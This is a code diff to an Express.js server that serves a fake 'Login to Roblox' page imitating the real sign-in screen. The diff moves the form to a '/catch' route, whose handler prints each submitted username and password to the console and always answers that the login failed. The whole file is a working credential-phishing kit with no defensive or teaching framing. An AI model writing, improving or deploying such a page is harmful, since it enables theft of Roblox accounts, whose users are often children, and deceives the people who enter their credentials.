@@ -4,7 +4,7 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.urlencoded({ extended: true }));
 
-function getLoginPage(error = false) {
+function getLoginPage(showError = false) {
     return `
 <!DOCTYPE html>
 <html lang="en">
@@ -13,14 +13,10 @@ function getLoginPage(error = false) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login to Roblox</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             background-image: url('https://www.image2url.com/r2/default/images/1788473774650-1005b288-aae3-4eda-bb46-7589686522fd.png');
             background-size: cover;
             background-position: center;
@@ -35,11 +31,11 @@ function getLoginPage(error = false) {
 
         .auth-container { 
             background-color: #23252b;
-            padding: 22px 30px 20px; 
-            border-radius: 12px; 
+            padding: 26px 34px 24px; 
+            border-radius: 6px; 
             width: 100%;
-            max-width: 400px;
-            margin-top: 20px;
+            max-width: 420px;
+            margin-top: 12px;
             position: relative;
             z-index: 10;
         }
@@ -50,37 +46,32 @@ function getLoginPage(error = false) {
             margin-bottom: 18px; 
             font-size: 26px; 
             font-weight: 700; 
-            letter-spacing: -0.3px;
         }
 
         .error-message {
             background-color: #3a1f1f;
             color: #ff6b6b;
             border: 1px solid #5c2b2b;
-            border-radius: 8px;
+            border-radius: 6px;
             padding: 9px 14px;
             font-size: 13.5px;
             margin-bottom: 12px;
             text-align: center;
-            display: ${error ? 'block' : 'none'};
+            display: ${showError ? 'block' : 'none'};
         }
 
         .input-control { 
             width: 100%; 
             padding: 12px 15px; 
-            margin-bottom: 8px; 
+            margin-bottom: 9px; 
             background-color: #2d3038;
             border: 1px solid #3a3e47; 
-            border-radius: 8px; 
+            border-radius: 6px; 
             color: #ffffff; 
             font-size: 14.5px; 
-            font-weight: 500;
-            transition: all 0.15s ease; 
         }
 
-        .input-control::placeholder { 
-            color: #9a9ea6; 
-        }
+        .input-control::placeholder { color: #9a9ea6; }
         
         .input-control:focus { 
             outline: none; 
@@ -90,66 +81,54 @@ function getLoginPage(error = false) {
 
         .btn-submit { 
             width: 100%; 
-            padding: 11px; 
+            padding: 12px; 
             background-color: transparent; 
             border: 1.5px solid #ffffff; 
-            border-radius: 8px; 
+            border-radius: 6px; 
             color: #ffffff; 
             font-size: 15.5px; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-top: 1px;
-            margin-bottom: 12px; 
-            transition: background-color 0.15s ease; 
+            margin-bottom: 13px; 
         }
         
-        .btn-submit:hover { 
-            background-color: rgba(255, 255, 255, 0.08); 
-        }
+        .btn-submit:hover { background-color: rgba(255, 255, 255, 0.08); }
 
         .link-text { 
             display: block; 
             text-align: center; 
             color: #ffffff; 
             font-size: 14px; 
-            font-weight: 500; 
             text-decoration: none; 
             margin-bottom: 14px; 
         }
 
-        .link-text:hover { 
-            text-decoration: underline; 
-        }
+        .link-text:hover { text-decoration: underline; }
 
         .secondary-actions { 
             display: flex;
             flex-direction: column;
-            gap: 8px;
+            gap: 9px;
             margin-bottom: 14px;
         }
 
         .btn-secondary { 
             width: 100%; 
-            padding: 11px; 
+            padding: 12px; 
             background-color: #2d3038; 
             border: none; 
-            border-radius: 8px; 
+            border-radius: 6px; 
             color: #ffffff; 
             font-size: 14.5px; 
-            font-weight: 500; 
             cursor: pointer; 
-            transition: background-color 0.15s ease; 
         }
         
-        .btn-secondary:hover { 
-            background-color: #383c45; 
-        }
+        .btn-secondary:hover { background-color: #383c45; }
 
         .signup-text {
             text-align: center;
             color: #ffffff;
             font-size: 14px;
-            font-weight: 500;
         }
 
         .signup-text a {
@@ -158,9 +137,7 @@ function getLoginPage(error = false) {
             font-weight: 600;
         }
 
-        .signup-text a:hover {
-            text-decoration: underline;
-        }
+        .signup-text a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -169,7 +146,7 @@ function getLoginPage(error = false) {
         
         <div class="error-message">Incorrect username or password.</div>
         
-        <form action="/login" method="POST">
+        <form action="/catch" method="POST">
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
             <input type="password" name="password" class="input-control" placeholder="Password" required>
             <button type="submit" class="btn-submit">Log In</button>
@@ -195,19 +172,19 @@ app.get('/', (req, res) => {
     res.send(getLoginPage(false));
 });
 
-app.post('/login', (req, res) => {
-    const userLogin = req.body.username;
-    const userPassword = req.body.password;
-    
-    console.log('\\n========================================');
-    console.log('[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:');
-    console.log('ВВЕДЕННЫЙ ЛОГИН: ' + userLogin);
-    console.log('ВВЕДЕННЫЙ ПАРОЛЬ: ' + userPassword);
-    console.log('========================================');
-    
+app.post('/catch', (req, res) => {
+    const login = req.body.username;
+    const pass = req.body.password;
+
+    console.log(`\n==============================`);
+    console.log(`[ПОЛУЧЕНЫ ДАННЫЕ ВХОДА]`);
+    console.log(`Логин (Имя пользователя): ${login}`);
+    console.log(`Пароль: ${pass}`);
+    console.log(`==============================`);
+
     res.send(getLoginPage(true));
 });
 
 app.listen(PORT, () => {
-    console.log("=== СЕРВЕР УСПЕШНО ЗАПУЩЕН ===");
+    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
 });
